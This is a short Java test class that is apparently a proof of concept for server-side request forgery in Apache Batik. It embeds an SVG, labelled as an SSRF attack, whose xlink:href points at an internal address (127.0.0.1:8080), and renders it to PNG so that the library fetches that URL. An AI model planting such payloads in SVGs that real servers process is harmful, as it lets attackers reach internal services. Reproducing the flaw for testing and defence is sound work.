package com.example;

import java.awt.Rectangle;
import java.awt.Graphics2D;
import java.awt.Color;
import java.io.ByteArrayInputStream;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;

import org.apache.batik.transcoder.TranscoderInput;
import org.apache.batik.transcoder.TranscoderOutput;
import org.apache.batik.transcoder.image.PNGTranscoder;

public class TestSVGGen {

  public void paint(Graphics2D g2d) {
    g2d.setPaint(Color.red);
    g2d.fill(new Rectangle(10, 10, 100, 100));
  }

  public static void main(String[] args) throws IOException {
    String svg = """
            <svg xmlns="http://www.w3.org/2000/svg"
                 xmlns:xlink="http://www.w3.org/1999/xlink"
                 width="450" height="500" viewBox="0 0 450 500">
                <text x="100" y="100" font-size="45" fill="blue">
                    image xlink:href SSRF attack
                </text>
                <use width="50" height="50"
                       xlink:href="http://127.0.0.1:8080/"/>
            </svg>
        """;

    InputStream svgInputStream = new ByteArrayInputStream(svg.getBytes("UTF-8"));
    TranscoderInput input = new TranscoderInput(svgInputStream);

    OutputStream pngOutputStream = new FileOutputStream("output.png");
    TranscoderOutput output = new TranscoderOutput(pngOutputStream);

    PNGTranscoder transcoder = new PNGTranscoder();
    try {
      transcoder.transcode(input, output);
    } catch (Exception e) {
    }

    pngOutputStream.flush();
    pngOutputStream.close();
  }
}
